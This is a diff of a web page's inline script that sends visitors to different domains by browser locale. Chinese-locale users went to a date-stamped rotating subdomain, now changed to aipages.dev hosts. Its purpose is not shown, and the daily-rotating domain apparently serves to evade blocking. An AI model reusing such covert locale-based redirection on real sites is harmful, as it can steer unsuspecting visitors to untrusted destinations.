@@ -54,9 +54,9 @@
     var d = new Date();
     var dateParam = d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0');
 
-    /* ===== 3. Chinese locale / CN browser -> domestic line ===== */
+    /* ===== 3. Chinese locale / CN browser -> domestic line =====        window.location.href = 'https://' + dateParam + '.72.chat/en' + search; */
     if (isCNBrowser || isZh) {
-        window.location.href = 'https://' + dateParam + '.72.chat/en' + search;
+        window.location.href = 'https://cloudflare.aipages.dev/' + search;
         return;
     }
 
@@ -68,7 +68,7 @@
     }
 
     /* ===== 5. Others (non-Chinese + mobile) -> global line ===== */
-    window.location.href = 'https://global.urldance.com/en' + search;
+    window.location.href = 'https://global.aipages.dev/en' + search;
 })();</script>
 </body>
 </html>
